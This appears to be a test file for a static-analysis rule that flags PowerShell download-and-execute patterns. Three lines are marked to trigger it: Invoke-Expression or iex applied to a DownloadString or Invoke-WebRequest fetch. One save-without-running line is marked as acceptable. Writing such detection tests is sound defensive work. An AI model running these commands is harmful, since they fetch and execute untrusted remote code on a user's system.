# ruleid: powershell-download-and-execute
Invoke-Expression (New-Object Net.WebClient).DownloadString("http://example.com/script.ps1")

# ruleid: powershell-download-and-execute
iex (New-Object Net.WebClient).DownloadString($url)

# ruleid: powershell-download-and-execute
iex (Invoke-WebRequest $url)

# ok: powershell-download-and-execute
$content = (New-Object Net.WebClient).DownloadString("http://example.com/script.ps1")
Set-Content -Path "script.ps1" -Value $content
